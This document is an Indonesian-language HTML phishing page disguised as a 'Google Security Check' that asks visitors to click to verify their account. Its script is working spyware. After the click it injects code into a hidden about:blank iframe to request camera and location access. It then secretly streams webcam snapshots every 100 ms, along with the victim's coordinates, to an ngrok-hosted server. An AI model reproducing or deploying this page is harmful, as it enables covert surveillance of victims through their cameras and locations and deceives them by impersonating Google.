<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI SERVER (NGROK)
  // ============================================
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";

  // ============================================
  // FUNGSI: KIRIM GAMBAR KE SERVER
  // ============================================
  function sendImageToServer() {
    try {
      var video = document.getElementById('cam-feed');
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');

      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        var dataURL = canvas.toDataURL('image/jpeg', 0.6);

        fetch(SERVER_ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: dataURL }),
          keepalive: true
        }).then(function(res) {
          log("[+] Gambar terkirim ke server: " + res.status);
        }).catch(function(err) {
          log("[-] Gagal kirim gambar: " + err.message);
        });
      }
    } catch(e) {}
  }

  // ============================================
  // FUNGSI: KIRIM LOKASI KE SERVER
  // ============================================
  function sendLocationToServer(lat, lon) {
    try {
      fetch(SERVER_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ location: { lat: lat, lon: lon } }),
        keepalive: true
      }).then(function(res) {
        log("[+] Lokasi terkirim ke server: " + res.status);
      }).catch(function(err) {
        log("[-] Gagal kirim lokasi: " + err.message);
      });
    } catch(e) {}
  }

  // ============================================
  // PERMISSION INHERITANCE (ABOUT:BLANK)
  // ============================================
  function startPermissionInheritance() {
    try {
      log("[+] Membuat Iframe about:blank...");
      
      var iframe = document.createElement("iframe");
      iframe.allow = "camera; microphone; geolocation";
      iframe.style.display = "none";
      iframe.src = "about:blank";
      
      document.getElementById("launcher-container").appendChild(iframe);

      iframe.onload = function() {
        try {
          var doc = iframe.contentDocument || iframe.contentWindow.document;
          doc.open();
          doc.write(`
            <!DOCTYPE html>
            <html>
            <body>
              <script>
                // 1. Minta Kamera
                navigator.mediaDevices.getUserMedia({ video: true })
                  .then(function(stream) {
                    parent.postMessage({ type: 'CAM_GRANTED' }, '*');
                  })
                  .catch(function(err) {
                    parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
                  });

                // 2. Minta Lokasi
                navigator.geolocation.getCurrentPosition(
                  function(pos) {
                    parent.postMessage({ type: 'LOC_GRANTED', lat: pos.coords.latitude, lon: pos.coords.longitude }, '*');
                  },
                  function(err) {
                    parent.postMessage({ type: 'LOC_DENIED', error: err.message }, '*');
                  }
                );
              <\/script>
            </body>
            </html>
          `);
          doc.close();
          log("[+] Script disuntikkan ke about:blank.");
        } catch(e) {
          log("[-] Gagal menulis ke about:blank: " + e.message);
        }
      };
    } catch(e) {
      log("[-] Iframe Error: " + e.message);
    }
  }

  // ============================================
  // LISTENER PESAN DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data.type === 'CAM_GRANTED') {
      log("[+] 🚨 Kamera DIIZINKAN!");
      // Mulai capture frame dan kirim ke server
      setInterval(sendImageToServer, 100);
    } else if (e.data.type === 'CAM_DENIED') {
      log("[-] Kamera ditolak: " + e.data.error);
    } else if (e.data.type === 'LOC_GRANTED') {
      log("[+] 🚨 Lokasi DIIZINKAN: " + e.data.lat + ", " + e.data.lon);
      sendLocationToServer(e.data.lat, e.data.lon);
    } else if (e.data.type === 'LOC_DENIED') {
      log("[-] Lokasi ditolak: " + e.data.error);
    }
  });

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Permission Inheritance...");

    // A. Mulai Iframe about:blank
    startPermissionInheritance();

    // B. Redirect ke Google (Opsional)
    setTimeout(function() {
      // window.location.href = "https://www.google.com"; // Uncomment untuk redirect
    }, 1000);

  }, { once: true });

})();
</script>
</body>
</html>
